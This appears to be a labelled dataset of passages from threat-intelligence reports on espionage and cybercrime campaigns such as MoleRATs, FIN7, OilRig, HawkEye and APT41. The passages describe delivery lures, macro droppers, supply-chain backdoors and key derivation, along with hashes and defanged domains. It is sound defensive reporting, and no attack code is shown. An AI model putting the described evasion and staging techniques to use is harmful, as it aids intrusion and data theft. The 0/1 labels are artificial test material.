Subscribe for Updates Research by: Cybereason Nocturnus Team Background Over the last several months, the Cybereason Nocturnus team has been tracking recent espionage campaigns targeting the Middle East. These campaigns are specifically directed at entities and individuals in the Palestinian territories. This investigation shows multiple similarities to previous attacks attributed to a group called MoleRATs (aka The Gaza Cybergang ), an Arabic-speaking, politically motivated group that has operated in the Middle East since 2012. In our analysis, we distinguish between two separate campaigns happening simultaneously. These campaigns differ in tools, server infrastructure, and nuances in decoy content and intended targets. The Spark Campaign : This campaign uses social engineering to infect victims, mainly from the Palestinian territories, with the Spark backdoor . This backdoor first emerged in January 2019 and has been continuously active since then. The campaign’s lure content revolves around recent geopolitical events, espeically the Israeli-Palestinian conflict, the assassination of Qasem Soleimani, and the ongoing conflict between Hamas and Fatah Palestinian movements. The Pierogi Campaign : This campaign uses social engineering attacks to infect victims with a new, undocumented backdoor dubbed Pierogi . This backdoor first emerged in December 2019, and was discovered by Cybereason. In this campaign, the attackers use different TTPs and decoy documents reminiscent of previous campaigns by",1

Unit 42 has evidence to suggest the threat actors have had access to the website since November 2014 if not earlier. Shortly after we reported the infection to the operators of the website, they took it offline. A new website containing the same content is hosted at “www.myanmarpresidentoffice.info”, which has several artifacts and references to the original content hosted at “president-office.gov.mm” but does not contain the exploit code. We believe the use of the new domain may be part of their remediation process. This blog discusses the known details of the watering hole, interesting characteristics of the delivered Evilgrab sample (AKA Vidgrab) and the threat infrastructure associated with the attack. Chain of Compromise The main page previously hosted at “www.president-office.gov.mm” was powered by Drupal, which loaded several Javascript files that applied a Drupal theme.

276,Long_Train,"Linked In Email Attack Analysis - Background and Lure With international attention focused on the tinderbox of the Korean peninsula, Cylance is shedding new light on a threat we call BAIJIU , one that preys upon heightened interest into what’s going on inside the borders of the hermit kingdom of North Korea. BAIJIU, which evades widespread detection, abuses global concern about the dire humanitarian situation in North Korea. It enters the target environment through an LNK file on the end of a phishing hook with the following bait: “2016 North Korea Hamgyung [sic] province flood insight.” The lure is a reference to a natural disaster that took place in late August 2016, when Typhoon Lionrock triggered massive flooding that wiped out much of North Korea’s province of North Hamgyong, impacting more than half a million people , drawing world-wide notice, and commanding international news coverage for several months.

In 2018-2019, researchers of Kaspersky Lab’s Global Research and Analysis Team analyzed various campaigns that used the same Tactics Tools and Procedures (TTPs) as the historic FIN7, leading the researchers to believe that this threat actor had remained active despite the 2018 arrests. In addition, during the investigation, we discovered certain similarities to other attacker groups that seemed to share or copy the FIN7 TTPs in their own operations. Recent FIN7 campaigns The FIN7 intrusion set continued its tailored spear phishing campaigns throughout last year. Kaspersky Lab has been able to retrieve some of these exchanges from a FIN7 target. The spear phishing campaigns were remarkably sophisticated from a social engineering perspective. In various cases, the operators exchanged numerous messages with their victims for weeks before sending their malicious documents. The emails were efficient social-engineering attempts that appealed to a vast number of human emotions (fear, stress, anger, etc.) to elicit a response from their victims. One of the domains used by the attackers in their 2018 campaign of spear phishing contained more than 130 email aliases, leading us to think that more than 130 companies had been targeted by the end of 2018.

The attacks were launched at a very limited subset of visitors to over two dozen different Tibetan websites that Storm Cloud had managed to compromise. Kaspersky has noted they uncovered similar targeted attacks dating back to mid-2019. Unlike strategic web compromises of the past, this attack activity did not rely on or use exploits. Instead, the attackers relied on enticing targeted users to install an “update to Adobe Flash” by way of a JavaScript overlay on top of the legitimate compromised websites. While there is no relation between the activities and those of OceanLotus, this type of attack is similar to how OceanLotus was observed launching targeted attacks. Delivery Overview For the attack to begin, an unsuspecting user must first visit one of the compromised sites that has been put into operation by Storm Cloud.

Yandex is known to be the largest search engine on the internet in Russia. Yandex.Direct is its online advertising network. We’ve contacted Yandex and they removed this malvertising campaign. While the Buhtrap backdoor source code has been leaked in the past and can thus be used by anyone, RTM code has not, at least to our knowledge. In this blog, we will describe how the threat actors distributed their malware by abusing Yandex.Direct and hosted it on GitHub. We will conclude with a technical analysis of the malware used. Distribution mechanism and victims The link that ties the different payloads together is how they were distributed: all malicious files created by the cybercriminals were hosted on two different GitHub repositories. There was usually only one malicious file downloadable from the repo, but it would change frequently. Since change history is available from the GitHub repository, it allows us to know which malware was distributed at any given time. One way victims would be lured into downloading these malicious files was through a website, blanki-shabloni24[.]ru , as shown in Figure 1. Figure 1. Landing page of blanki-shabloni24[.]ru The website design as well as all malicious filenames were quite revealing: they were all about forms, templates and contracts. The fake software name translates to: “Collection of Templates 2018: forms, templates, contracts, samples”. Given the fact that Buhtrap and RTM have been used in the past to target accounting departments, we immediately believed that a similar strategy was at play. But how were potential victims directed to the website? Infection campaigns At least some of the potential victims who ended up on this website were lured there through malvertising. Below you can see an example of a redirect URL to the malicious website: https://blanki-shabloni24.ru/?utm_source=yandex&utm_medium=banner&utm_campaign=cid|{ blanki_rsya }|context&utm_content=gid|3590756360|aid|6683792549|15114654950_&utm_term= скачать бланк счета &pm_source= bb.f2.kz &pm_block=none&pm_position=0&yclid=1029648968001296456 We can see in the URL that a banner ad was posted on bb.f2[.]kz, which is a legitimate accounting forum. It is important to note here that these banners appeared on several different websites, all with the same campaign id (blanki_rsya) and most of them related to accounting or legal aid services. From the URL, we can also see what the user was searching for – “скачать бланк счета” or “download invoice template” – reinforcing our hypothesis that organizations are targeted.

289,Long_Train,"We quickly realized that we were dealing with a case of a compromised digital signature. We believe this to be the result of a sophisticated supply chain attack, which matches or even surpasses the ShadowPad and the CCleaner incidents in complexity and techniques. The reason that it stayed undetected for so long is partly the fact that the trojanized software was signed with legitimate certificates (e.g. “ASUSTeK Computer Inc.”). The goal of the attack was to surgically target an unknown pool of users, who were identified by their network adapters’ MAC addresses. To achieve this, the attackers had hardcoded a list of MAC addresses into the trojanized samples and the list was used to identify the intended targets of this massive operation. We were able to extract more than 600 unique MAC addresses from more than 200 samples used in the attack. There might be other samples out there with different MAC addresses on their lists, though. Technical details The research started upon the discovery of a trojanized ASUS Live Updater file (setup.exe), which contained a digital signature of ASUSTeK Computer Inc. and had been backdoored using one of the two techniques explained below. In earlier variants of ASUS Live Updater (i.e. MD5:0f49621b06f2cdaac8850c6e9581a594), the attackers replaced the WinMain function in the binary with their own. This function copies a backdoor executable from the resource section using a hardcoded size and offset to the resource. Once copied to the heap memory, another hardcoded offset, specific to the executable, is used to start the backdoor. The offset points to a position-independent shellcode-style function that unwraps and runs the malicious code further. Some of the older samples revealed the project path via a PDB file reference: “ D:\C++\AsusShellCode\Release\AsusShellCode.pdb “. This suggests that the attackers had exclusively prepared the malicious payload for their target. A similar tactic of precise targeting has become a persistent property of these attackers. A look at the resource section used for carrying the malicious payload revealed that the attackers had decided not to change the file size of the ASUS Live Updater binary. They changed the resource contents and overwrote a tiny block of the code in the subject executable. The layout of that patched file is shown below. We managed to find the original ASUS Live Updater executable which had been patched and abused by the attackers. As a result, we were able to recover the overwritten data in the resource section. The file we found was digitally signed and certainly had no infection present. Both the legitimate ASUS executable and the resource-embedded updater binary contain timestamps from March 2015. Considering that the operation took place in 2018, this raises the following question: why did the attackers choose an old ASUS binary as the infection carrier? Another injection technique was found in more recent samples. Using that technique, the attackers patched the code inside the",0

HawkEye is another example of a malware kit that is actively being marketed across various hacking forums. Over the past several months, Talos observed ongoing malware distribution campaigns attempting to leverage the latest version of the HawkEye keylogger/stealer, HawkEye Reborn v9, against organizations to steal sensitive information and account credentials for use in additional attacks and account compromise. History of HawkEye HawkEye is a malware kit that has been around for several years and has seen continuous development and iterations since at least 2013. It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems.

In December 2018, a thread on HackForums described a change in the ownership and ongoing development of the HawkEye keylogger. Shortly following this exchange,",1

The information collected by the malware and the control over the victim's mobile device allows their operators to perform more complex social engineering attacks. A motivated attacker can use this trojan to harvest usernames and passwords and then reuse them to login into the organization's system where the victim works. This is a good example where two-factor authentication based on SMS would fail since the attacker can read the SMS. Corporations can protect themselves from these side-channel attacks by deploying client-based two-factor authentication, such as Duo Security . One of the most impressive features of this malware is its resilience. If the command and control (C2) server is taken down, the malicious operator can still recover the malware control by sending SMS messages directly to the infected devices. This makes the taking down and recovery of the network much harder and poses a considerable challenge for defenders. The campaign The malware's primary infection vector is SMS. Just like the old-school mail worms that used the victim's address book to select the next victims, this banking trojan's activation cycle includes the exfiltration of the victim's address book. The trojan will receive instructions from the C2 to spread. Spread command from C2 The victim receives the command sendSMSMass. Usually, this message targets four or five people at a time. The body contains a message and URL. Again, the concept is that new victims are more likely to install the malware if the SMS comes from someone they know. When a victim tries to access the URL in the SMS body, the C2 will check if the mobile",0

Mandiant’s APT1 report was the first to change the game, and paved the way for private security companies to expose advanced threat actors en masse. In the years since, both private security companies and media organizations alike have sought to capitalize on this craze. What is often neglected is reporting on the aftermath of such exposure, and what measures the attackers take to remain hidden, ready to strike again. Very few reports offer follow-ups to what transpires after an attacker is completely pushed out of an environment. If they did, those reports would most likely paint a much bleaker picture of the cyberthreat landscape. The truth is most companies are never aware they’ve been breached again, even if they are hit multiple times after the initial attack. The truth is",1

Regular cybercriminals will typically need to think of how they can compromise as many individual devices as possible (for example, to deliver ransomware, coin miners, or banking trojans) while targeted attack threat actors will need to plan how to infiltrate and gain full access to corporate networks and remain as discreet as possible. In addition, targeted attack campaigns often involve extensive planning as well as the creation and use of highly specialized tools. On the other hand, normal threat actors might not have the ability or resources to plan sophisticated campaigns and their tools are more generic in nature and are often available in underground markets . However, we recently came across evidence of a large-scale cybercrime activity that appears",0

The Attack On July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the targeted organization. All of the emails sent had the same subject, attachment filename, and attached Excel file (SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6). We identified the Excel file attached to the delivery email as a variant of the Clayslide delivery documents used by the OilRig campaign. A closer look revealed that although it was similar to previous Clayslide documents, it was also quite different in several aspects. Like the previous samples, it displays a worksheet titled “Incompatible” containing a banner that shows a fake compatibility warning message (Figure 1). The message is an attempt to trick the user into clicking the “Enable Content” button, which would run a malicious macro embedded within the Excel file Figure 1 Incompatible message attempting to trick the victim into enabling macros The macro within the delivery document will unhide and display a new worksheet that contains a fake invoice for Citrix products, as seen in Figure 2. This fake invoice acts as a decoy document to minimize the user’s suspicions that any malicious activity occurred. Figure 2 Decoy document opened to minimize suspicions of compromise While the macro displays the decoy invoice spreadsheet, it silently runs malicious code in the background to install its payload. The malicious code starts by concatenating several base64 encoded strings into a single variable. As you can see in the following code snippet, the variable name “Paltofp1” suggests that the author of this code may want our attention: The macro then writes the concatenated base64 encoded data to the file %PUBLIC%\Libraries\B642.txt. It then reads in the “B642.txt” file and decodes the data, which it will save to the file %PUBLIC%\Libraries\servicereset.exe (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9).

Unit 42 also tracks the APT3 group using the name UPS, which is an intrusion set with Chinese origins that is known for having early access to zero-day vulnerabilities and delivering a backdoor called Pirpi. The UPS group has exploited several zero-day vulnerabilities, most recently using the zero-days released in the Hacking Team breach that we discussed in our July 10 blog post, “ APT Group UPS Targets US Government with Hacking Team Flash Exploit”. However, the most recent original zero-day released by this group is tracked by CVE-2015-3113, which has similarities to the once zero-day vulnerabilities CVE-2014-1776 and CVE-2014-6332 exploited by UPS in May and November 2014, respectively. We’ll discuss here the similarities observed between the various components used to exploit these two vulnerabilities, specifically focusing on the malicious Flash files and the payloads delivered. Malicious Flash Files Recent zero-day vulnerabilities exploited by UPS exploit or leverage Adobe Flash to exploit other applications on the system. Unit 42 recently analyzed malicious Flash files that exploited CVE-2015-3113 , which was a zero-day vulnerability in Adobe Flash that was patched on June 23, 2015. .

The SANS ISC recently published a very interesting technical analysis of Bartalex . With this post, we hope to add a little more color and supplement what you already know about this prolific malware distributor. Victims of Bartalex (and the later-stage malware Bartalex installs) are infected via Office documents embedded with macros that, when executed, install Bartalex. In older versions of Office, the infection occurs when the document is opened due to a special VBA function called Auto_Open . Newer versions of Office have security settings in place to prevent the auto-execution of such code. Thus, an attacker usually relies on social engineering tricks to make sure the macros still trigger. T he message contained in the body of the document is attempting to social engineer the user into enabling the malicious macros.

It uses a multi-stage installation process with specific checks at each point to identify if it is undergoing analysis by a security researcher. The primary functionality of this tool is to gather information about the victim. In fact, the author chose to store critical files dropped by the Trojan in a directory named “Intel.” T9000 is pre-configured to automatically capture data about the infected system and steal files of specific types stored on removable media. We have observed T9000 used in multiple targeted attacks against organizations based in the United States. However, the malware’s functionality indicates that the tool is intended for use against a broad range of users. In this report, we share an analysis of each stage in T9000’s execution flow. Stay tuned for a future report in which we will provide more detail on how this tool has been used and the infrastructure we have identified as part of our analysis. T9000 Backdoor Analysis The entire execution flow of the malware is represented in the following diagram: As this malware uses a multistage execution flow, we’ll discuss each stage individually. Initial Exploitation The sample of T9000 used in this analysis was originally dropped via a RTF file that contained exploits for both CVE-2012-1856 and CVE-2015-1641 . When triggered, an initial shellcode stage is run, which is responsible for locating and executing a secondary shellcode stub. The second stage shellcode reads the initial RTF document and seeks to the end of the file, using the last four bytes as the size of the embedded payload. With the payload size confirmed, the shellcode will create a file in the %TEMP% folder using a temporary filename. The shellcode will decrypt and subsequently load the embedded payload in the RTF file. The decrypted payload is written to the temporary file and executed using WinExec. The shellcode then attempts to decrypt an embedded decoy document with the same algorithm used to decrypt the payload, which it will save to %TEMP%\~tmp.doc path. This file is",1

The first is that it allows the downloaders, which in this case are also banking Trojans, to perform their own cybercrime operations while also profiting by providing distribution services to their kin. In the second, a subscriber to different malware services may simply want to increase the chance of extracting valuable information by bombarding their victims with multiple malware exploits.

This leads us to believe that they are all the work of the same actors—a group we’ve dubbed RATicate . A new campaign we believe connected to the same actors leverages concern about the global COVID-19 pandemic to convince victims to open the payloads. This is a shift in tactics, but we suspect that this group constantly changes the way they deploy malware—and that the group has conducted campaigns prior to this past November. In this post, we’ll focus on the initial wave of campaigns, which all used Nullsoft Scriptable Install System (NSIS) installers. NSIS is an open source tool for creating Windows installers, designed for Internet-based software distribution. But it has also been abused for a long time to disguise and deploy malware. (We’ll discuss newer campaigns using other installers, and the group’s shift in phishing tactics, in an upcoming follow-up report.) Plugged in for malware One of the interesting features of NSIS installers is their plug-in architecture, which allow installers to communicate with other software components—including components of the Windows operating system. (A list of available plug-ins can be found here .) These plug-ins are deployed as Windows DLL files. If selected during the installer build, they will be automatically added to the final compiled NSIS installer’s packaged files inside the “$PLUGINS” folder. Some of the capabilities these plugins can provide include: Killing processes Executing Command Line based programs Dynamically decompressing files Loading a DLL and calling to its exports The installers we looked at caught our attention because they all drop the same set of “junk files” (files that are never used by the installed malware) across the initial",1

Throw the emotions involved with every trading decision into the mix and it can become a stressful ordeal. Hence, the advent of automatic trading applications, popularly known as trading bots. In simple terms, these bots monitor bitcoin price differences between different trading platforms. If an opportunity for profit appears, they automatically buy or sell bitcoin between the platforms, effectively arbitraging between the two. The criteria for an opportunity are still based on parameters set by the user though. So obviously, they are not fully autonomous.

The Linux malware is the well-known “ Shellbot ”, it is a crimetool belonging to the arsenal of a threat actor tracked as the “Outlaw Hacking Group. ” The Outlaw Hacking Group was first spotted by TrendMicro in 2018 when the cyber criminal crew targeted automotive and financial industries. The Outlaw Botnet uses brute force and SSH exploit (exploit Shellshock Flaw and Drupalgeddon2 vulnerability ) to achieve remote access to the target systems, including server and IoT devices. The first version spotted by TrendMicro includes a DDoS script that could be used by botmaster to set-up DDoS for-hire service offered on the dark web.

357,Long_Train,"and Instagram users. The campaigns vary in complexity, resource needs and methods. Below, we outline examples of a network attack, application clones and classic phishing. It is our belief that these campaigns were used to specifically target Iranian users of the Telegram app in an effort to steal personal and login information. Once installed, some of these Telegram ""clones"" have access to mobile devices' full contact lists and messages, even if the users are also using the legitimate Telegram app. In the case of phony Instagram apps, the malicious software sends full session data back to backend servers, which allows the attacker to take full control of the account in use. We declare with high confidence that these apps should be classified as ""greyware."" It is not malicious enough to be classified as malware, but is suspicious enough to be considered a potentially unwanted program (PUP). This kind of software is difficult to detect, as it typically fulfills its functions that are expected by the user (ex. send messages). The only time this kind of software is detected by security researchers is if it has an impact somewhere else. Talos eventually discovered several pieces of software that have the potential to be used in far-reaching campaigns. We believe this greyware has the potential to reduce the privacy and security of mobile users who use these apps. Our research revealed that some of these applications send data back to a host server, or are controlled in some way from IP addresses located in Iran, even if the devices are located outside the country. Another method we saw in the Iranian attacks was the creation of fake login pages. Even though this isn't an advanced technique, it is effective against users who aren't as aware of cybersecurity as they should be. Iran-connected groups like ""Charming Kitten"" have been using this technique for a while targeting secure messaging apps. Some actors are also hijacking the device's BGP protocol. This technique redirects the traffic of all routers, without the device considering the original of those new routes. In order to hijack BGP, there needs to be some sort of cooperation from an internet service provider (ISP), and is easily detectable, so the new routes won't be in place for very long. Talos hasn't found a solid connection between the several attacks we've observed, but all of them target Iran and their nationals and the Telegram app. Although this post focuses",1
358,Long_Train,"Additionally, during the analysis of these campaigns, Talos identified a dedicated spam botnet that is currently delivering malicious spam emails as part of the infection process. Distribution campaigns While analyzing these campaigns, Talos identified two separate infection processes that we believe attackers have used between late October and early November. These campaigns used different file types for the initial download and infection process, and ultimately delivered two separate banking trojans that target Brazilian financial institutions. Both campaigns used the same naming convention for various files used during the infection process and featured the abuse of link-shortening services to obscure the actual distribution servers used. The use of link shorteners also allows some additional flexibility. Many organizations allow their employees to access link shorteners from corporate environments, which could enable the attacker to shift where they are hosting malicious files, while also enabling them to leverage these legitimate services in email-based campaigns.

In another campaign, the attackers have been targeting hundreds of Google and Yahoo accounts, successfully bypassing common forms of two-factor authentication. Introduction From the arsenal of tools and tactics used for targeted surveillance, phishing remains one of the most common and insidious form of attack affecting civil society around the world. More and more Human Rights Defenders (HRDs) have become aware of these threats. Many have taken steps to increase their resilience to such tactics. These often include using more secure, privacy-respecting email providers, or enabling two-factor authentication on their online accounts. What is phishing? Credentials phishing consists in the creation of a website that imitates the login prompt of a given online service, such as Gmail or Facebook, with the objective of luring a victim into visiting the malicious page and entering their username and passwords, thereby transmitting these credential to the attackers. Example of a phishing site imitating Facebook. However, attackers too learn and adapt in how they target HRDs. This report documents two phishing campaigns that Amnesty International believes are being carried out by the same attacker (or attackers) likely originating from amongst the Gulf countries. These broad campaigns have targeted hundreds, if not a thousand, HRDs, journalists, political actors and others in many countries throughout the Middle East and North Africa region. What makes these campaigns especially troubling is the lengths to which they go to subvert the digital security strategies of their targets. The first campaign, for example, utilizes especially well-crafted fake websites meant to imitate well-known “secure email” providers. Even more worryingly, the second demonstrates how attackers can easily defeat some forms of two-factor authentication to steal credentials, and obtain and maintain access to victims’ accounts. As a matter of fact, Amnesty Tech’s continuous monitoring and investigations into campaigns of targeted surveillance against HRDs suggest",0

Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS.

Compared to other backdoor tools associated with the Sofacy group, the use of Zebrocy in attack campaigns is far more widespread. The cluster of activity we detail in this blog revolves primarily around a common author name used in each of the delivery documents: Joohn. Our initial sample of interest was the delivery document using the crash list(Lion Air Boeing 737).docx filename, which delivered the Zebrocy tool. By leveraging our AutoFocus threat intelligence platform in conjunction with data collected from VirusTotal , we were able to pivot from artifacts discovered in the metadata and behaviors to discover the Cannon tool, as well as a number of additional delivery documents, payloads, and targets.

Some malicious actors prefer to develop their own code/tools with the hope to remain under the radar while benefiting of similar functionality. Historically, mobile banking malware was designed and used primarily to access and steal information that facilitates financial fraud. Examples of such information include second factors of authentication (SMS, mTAN) and other secrets that could be used to perform fraud through the targeted banking services. As fraud detection mechanisms used by financial institutions evolved it became harder for criminals to use aforementioned methods without being detected. Threat actors have conceived diverse ways to circumvent detection mechanisms by impersonating the victim’s device. A famous one is the use of a back-connect proxy on the infected device combined with device fingerprints, allowing the actor’s device to look like the ""real"" one. Solutions like device binding and fingerprinting allowed financials to detect such techniques, therefore criminals had to innovate again. In this situation RATs are criminals’ Holy Grail, as they offer the ability to perform fraudulent transactions directly from the infected (victim) device. By doing so, criminals are making it substantially harder to detect fraudulent transactions without a client-based detection solution. In Android banking malware, the RAT capability has not been commonly used due to limitations of the Android operating system (it requires use of the Accessibility Service). Nevertheless, back in 2016 the “Retefe” threat actors were already observed making use of RAT functionality by abusing the TeamViewer application, giving them full control over the infected device. As Retefe is run by a group of experienced Windows malware actors and because RAT capabilities are quite common in Windows banking malware, the actors probably decided to reuse that approach with Android devices as well. Threat actors motivated by financial gain have noticed the shift of consumers from desktop towards mobile based online banking. This trend has also resulted in the evolution of mobile malware in order to bypass detection measures.",1

Insight into the possible workflow and setup of the attackers, including their infrastructure. Obfuscation and social engineering techniques used. The credential theft payload. Technical Analysis Dropper Evolution Apart from a brief period of time in January 2017, when the actors delivered the encoded JScript content via Delphi-compiled dropper executable files, we have primarily observed only weaponized documents using Microsoft Office Macros using Visual Basic for Applications (VBA) code to install Nemucod. It’s hard to know why the attackers changed briefly from using weaponized documents to using executable files and then switched back again, especially considering the volume of documents carrying malware nowadays. Perhaps they were testing their own or their targets’ capabilities. In total Unit 42 has seen over 50 versions of these weaponized documents spanning from late October through to March. We’ve used these to lay out a timeline, which will be referenced throughout the remainder of this blog, of the milestones of evolution that provides some insight into why the changes are made. Note: This figure does not cover all versions seen but simply milestone changes. It does however start with the first version created on October 23 rd , last saved 25 th October and first seen by our Wildfire cloud sandbox 26 th October. Figure 5: Timeline showing evolution of Nemucod weaponized documents. Common throughout all versions of the weaponized document droppers is password-protected VBA code, as shown in Figure 6 below. The attackers use this to hinder researcher analysis and perhaps to give the document more legitimacy for those people, or security solutions, looking at such properties. Figure 6: Password-protected VBA editor to protect code Also common to all versions is the use of a heavily obfuscated JScript payload, an excerpt of which is shown in Figure 7. The obfuscation makes use of variable names that are seemingly randomly generated, extensive use of Unicode character encoding (e.g. \u00xx) where xx is the ASCII character code representation, and the use of generally unnecessary arithmetic to piece together sub-strings or select characters from strings. Such obfuscation is primarily to avoid signature-based detection technologies but has little to no effect on dynamic analysis sandbox systems, such as Wildfire.

We also identified several sandboxes that fail to analyze ODT documents, as it is considered an archive, and the sandbox won't open the document as a Microsoft Office file. Because of this, an attacker can use ODT files to deliver malware that would normally get blocked by traditional antivirus software. We only found a few samples where this file format was used.

The sample set associated with each of these testing activities is rather small, but the changes made to each of the files give us a chance to understand what modifications the actor performs in an attempt to evade detection. This testing activity also suggests that the threat group responsible for the OilRig attack campaign have an organized, professional operations model that includes a testing component to the development of their tools. Testing Activity, Analysis, and Methodology We collected two sets of ClaySlide samples that appear to be created during the OilRig actor’s development phase of their attack lifecycle. The threat actor uploaded each of these files to a popular antivirus testing website to find out which vendors detected the file. The actor then made subtle modifications to the file and uploaded the newly created file to the same popular antivirus testing website in order to determine how to evade detection. The flowchart in Figure 1explains the process in which the threat actors followed during their testing activities. Figure 1 Flowchart describing the testing process carried out by OilRig actor Lucky for us, the threat actors do not modify the metadata within their delivery documents, which allows us to determine when the actor last modified each Word document. These untainted timestamps allow us to create a timeline that we can use to order the files as they were created by the actor. Our analysis methodology involves iteratively comparing each file with the next file in the timeline to determine the changes the actor made to the first file that resulted in the creation of the second file. The first testing activity we observed began with an initial sample created on June 13, 2016 with 17 subsequent files created for testing purposes that the actor created in a two-hour period on June 15, 2016.

After we notified Google about the involved applications, they quickly took them off of the Play Store and banned the associated developer. Infrastructure: The Early Days The full list of indicators belonging to this campaign and shared by Amnesty on GitHub showed multiple websites that used keywords such as “mail”, “secure”, or “verify”, possibly not to arouse any suspicions and to masquerade as legitimate mailing services. By visualizing the information available about each of these websites, we saw clear connections between them: they were registered using NameCheap, had HTTPS certificates, and many of them resolved to the same IP addresses. The addresses shared the same IPv4 range or netblock (185.125.228[.]0/22), which belongs to a Russian telecommunications company called MAROSNET.

Figure 1: Blog post overview DEADEYE – RC5 Tracking APT41 activities over the past months, we observed multiple samples that shared two unique features: the use of RC5 encryption which we don’t encounter often, and a unique string “ [email protected] !rCto R$.”. We track these samples as DEADEYE. DEADEYE comes in multiple variants: DEADEYE.DOWN has the capability to download additional payloads. DEADEYE.APPEND has additional payloads appended to it. DEADEYE.EXT loads payloads that are already present on the system. DEADEYE.DOWN A sample belonging to DEADEYE.DOWN (MD5: 5322816c2567198ad3dfc53d99567d6e ) attempts to download two files on the first execution of the malware.

The command and control (C2) server response is first RC5 decrypted with the key “wsprintfA” and then RC5 encrypted with a different key and written to disk as <MODULE_NAME>.mui. The RC5 key is constructed using the volume serial number of the C drive. The volume serial number is a 4-byte value, usually based on the install time of the system. The volume serial number is XORed with the hard-coded constant “ [email protected] !rCto R$.” and then converted to hex to derive a key of up to 28 bytes in length. The key length can vary if the XORed value contains an embedded zero byte because the lstrlenA API call is used to determine the length of it. Note that the lstrlenA API call happens before the result is converted to hex. If the index of the byte modulo 4 is zero, the hex conversion is in uppercase. The key derivation is illustrated",1

Trickbot is a well-known, modular credential stealer first discovered in 2016 . It has been thought to be a descendent of another well-known credential stealer called Dyreza, or Dyre, due to similarities in functionalities and codebase. Due to its modularity, operators of Trickbot are able to gain access to different functions and capabilities by retrieving additional modules from the command and control (C2) servers. These include capabilities such as a worming function (i.e. copying itself to other devices), email inbox parser, and network reconnaissance. Between November 7 – 8, 2019, Unit 42",0

This disabled the attacker’s access to their victims in this campaign, provided further insight into the targets currently victimized in this operation, and enabled the notification of affected parties. Post Publication In the week following the publication of the original blog, we observed no unusual changes to the C2 infrastructure. Existing domains did move to new IP addresses, as we had previously seen periodically. Some new install domains were added, adhering to naming conventions of current domains (see appendix for new IOCs). The attackers developed a new version (31), and we observed this deployed against a single Canadian target. The file descriptions remained essentially the same (“CLMediaLibrary Dynamic Link Library V3”). Most importantly, there was no change to the encoding key (now using offset 20, and offset 11 for second pass against URL encoding) that we had observed being used for the entire decade-long campaign, and documented in our previous blog. From this we conclude that the attackers were unaware of our initial report. Sinkhole Through cooperation with the parties responsible for the C2 domains, we took control of all but one of them, transferring the A records to a server we controlled.

It may be difficult for primary target organizations to detect activity and defend themselves at the perimeter.

Of course, the potential also exists for the adversary to move away from a targeted maneuver to more broadly focused disruptions that could incorporate a much wider array of businesses and even consumers.

An interesting aspect of the actor's delivery method is their use of modified pirated software as their initial attack vector before the samples move on to common ""living-off-the-land"" methods at later stages of the attack. Vivin makes a minimal effort to hide their actions, making poor operational security decisions such as posting the same Monero wallet address found in our observable samples on online forms and social media. Nor do they discriminate in their targeting, attempting to capitalize on general user behavior, rather than targeting, to generate as large a victim pool as possible. Despite the market downturn for cryptocurrency values in 2018, cryptomining remained a popular attack method for malicious actors throughout 2019 and heading into 2020. Over the course of last year, Talos Incident Response observed a number of cryptomining attacks , some of which potentially involved higher coordinated cybercrime groups and collaboration between multiple different threat actors. While more sophisticated actors certainly pose a significant threat, organizations should remain cognizant of the additional threat posed by less advanced actors employing wide or unrestricted targeting. Talos has previously documented one such actor, ""Panda,"" illustrating their potential for long-term exploitation of their victims' resources and their resilience from being deterred from future action. These attributes make Vivin, and other actors like them, legitimate risks to organizational resource abuse and potential data theft. The tactics, techniques, and procedures (TTPs) used by Vivin expose the actor's campaigns to multiple potential points of mitigation. Some of these include good systems hygiene such as preventing the use of pirated software on endpoints, proper event logging and monitoring, and systems resource monitoring. Other mitigation strategies involve a more active defense. For example, blocking the URIs used by the mining pools and the malware's intermediate stages. Detection signatures can also prevent the XMRig miner from being dropped and executed on targeted hosts. What's new? This is yet another reminder",1

These marketplace platforms were created by the threat actor; we were able to discover 30 different platforms used to distribute the trojanized themes and plugins. Three of the most popular webpages on these platforms were; ● “Ultimate Support Chat” with approximately 700k views ● “Woocomerence Product filter” with approximately 175k views and ● “Slider Revolution v5.4.8.1” with approximately 125k views. Thus far Prevailion has been able to identify over 20k actively compromised web servers worldwide, that are displaying evidence of compromise . This data is currently available on the Prevailion Apex platform . Based upon the number of views from the malicious platforms, we speculate that the total number of infected webservers is likely much higher, potentially in the hundreds of thousands. Due to the pandemic nature of this threat, Prevailion coordinated their efforts with appropriate U.S law enforcement on this campaign. The attack commences when an unsuspecting victim uploads a trojanized theme to their web server. References to those trojanized files date back to stack overflow posts from October 2017. Once all the malicious files are downloaded, the threat actor gained full control over the web server - allowing them to add an administrative account, recover the web admin’s email account and WordPress password hash. If the password was recovered, from the hash and was used for multiple accounts, it could allow access to corporate resources. In most cases we assess that the web servers ultimately became part of the Propeller Ads advertising network. Additional research shows that the Propeller Ads network has been associated with a plethora of malicious activity from different threat actors, including but not limited to malvertising and the Fallout exploit kit .

441,Long_Train,"The malware families identified at this time are DarkComet, LuminosityLink RAT, Pony, ImmenentMonitor, and some multiple variations of shellcode. We are calling the malicious loader StegBaus based on its use of custom steganography and a PDB string, which was found in an embedded DLL. Because of the large number of infections that the aforementioned malware families have previously been involved in, any new loading techniques that could make it easier for an attacker to execute these malware families on a victim computer should be taken seriously and an attempt at identifying it pre-infection should be treated as a high-priority. This loader is unique in numerous ways, most notably the steganography that is being used to hide the loader configuration, as well as the final payload. These features will be discussed in the analysis section below. The loader also uses common techniques, such as the RunPE method, to load final payload into memory as a new process. This method has been seen in the wild for a number of years and typically involves utilizing a host process, threading contexts, and memory allocation. Although these steps appear to be relatively static within the loader, there are slight differences we were able to identify based on the time of deployment. One such case is a sample that appears to have been used for testing at least 6 months before the majority of samples were seen in the wild. UPDATE: The domains tags[.]bkrtx[.]com and sg[.]symcb[.]com were erroneously included in the list of domains below. On",0

